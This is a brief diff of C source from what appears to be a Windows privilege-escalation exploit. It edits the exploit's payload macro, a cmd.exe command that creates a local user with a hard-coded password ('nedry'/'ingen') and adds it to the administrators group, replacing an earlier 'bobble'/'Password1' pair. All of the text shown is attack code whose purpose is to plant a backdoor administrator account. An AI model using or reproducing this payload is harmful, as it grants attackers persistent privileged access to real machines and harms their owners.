@@ -5,7 +5,7 @@
 
 #define MAX_PROCESSES 1000
 
-#define COMMAND_LINE L"cmd.exe /c net user bobble Password1 /add && net localgroup administrators bobble /add"
+#define COMMAND_LINE L"cmd.exe /c net user nedry ingen /add && net localgroup administrators nedry /add"
 
 HANDLE GetThreadHandle()
 {
